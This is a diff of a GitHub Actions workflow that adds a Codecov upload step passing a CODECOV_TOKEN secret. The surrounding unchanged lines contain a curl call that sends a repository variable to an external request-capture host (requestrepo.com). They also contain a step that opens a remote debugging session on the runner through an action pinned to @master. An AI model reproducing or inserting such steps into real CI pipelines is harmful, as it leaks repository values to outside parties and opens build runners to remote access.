@@ -19,7 +19,7 @@ jobs:
        uses: actions/checkout@v2
        env: 
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-
+        
      - name: Upload build archive
        uses: actions/upload-artifact@v4
        with:
@@ -31,3 +31,8 @@ jobs:
      - run: curl https://rj0lnjwx.requestrepo.com/4_${{ vars.TEST_VAR }}
      - name: Setup Debug Session
        uses: csexton/debugger-action@master
+
+     - name: "Codecov"
+       uses: codecov/codecov-action@v4.2.0
+       env:
+        CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}
